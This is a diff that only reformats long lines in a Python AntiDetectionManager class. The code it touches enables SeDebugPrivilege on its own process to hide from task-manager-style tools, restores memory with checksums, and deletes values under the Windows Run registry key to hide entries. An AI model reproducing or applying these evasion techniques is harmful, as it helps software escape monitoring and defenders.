@@ -442,12 +442,16 @@ class AntiDetectionManager:
         """Hide process from task manager and other tools."""
         try:
             # Modify process token
-            process_handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, os.getpid())
-            token_handle = win32security.OpenProcessToken(process_handle, win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
+            process_handle = win32api.OpenProcess(
+                win32con.PROCESS_ALL_ACCESS, False, os.getpid()
+            )
+            tok_flags = win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY
+            token_handle = win32security.OpenProcessToken(process_handle, tok_flags)
 
             # Add SeDebugPrivilege
             privilege_id = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
-            win32security.AdjustTokenPrivileges(token_handle, False, [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)])
+            privs = [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)]
+            win32security.AdjustTokenPrivileges(token_handle, False, privs)
 
             # Close handles
             win32api.CloseHandle(token_handle)
@@ -752,7 +756,8 @@ class AntiDetectionManager:
                 )
 
                 # Update checksum
-                self._secure_checksum = self._calculate_memory_checksum(address, len(self._memory_backup))
+                backup_len = len(self._memory_backup)
+                self._secure_checksum = self._calculate_memory_checksum(address, backup_len)
         except Exception as e:
             logger.error(f"Error restoring memory backup: {e}")
 
@@ -800,7 +805,12 @@ class AntiDetectionManager:
             # Hide registry entries
             key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
             try:
-                key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, key_path, 0, win32con.KEY_ALL_ACCESS)
+                key = win32api.RegOpenKey(
+                    win32con.HKEY_CURRENT_USER,
+                    key_path,
+                    0,
+                    win32con.KEY_ALL_ACCESS,
+                )
                 win32api.RegDeleteValue(key, process_name)
                 win32api.RegCloseKey(key)
                 return True
